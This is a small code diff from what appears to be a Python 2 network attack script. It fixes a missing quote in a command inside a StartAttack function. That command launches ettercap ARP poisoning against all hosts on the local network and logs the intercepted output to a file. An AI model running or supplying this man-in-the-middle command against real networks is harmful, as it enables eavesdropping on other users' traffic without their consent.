@@ -106,7 +106,7 @@ def StartAttack():
         except:
                 print red + "Error - Starting Ettercap failed" + white
         else:
-                command = "ettercap -T -q -i " + interface + " -M arp // // >" + Path + "/ettercap.txt &
+                command = "ettercap -T -q -i " + interface + " -M arp // // >" + Path + "/ettercap.txt &"
                 os.system(command)
 	
 	
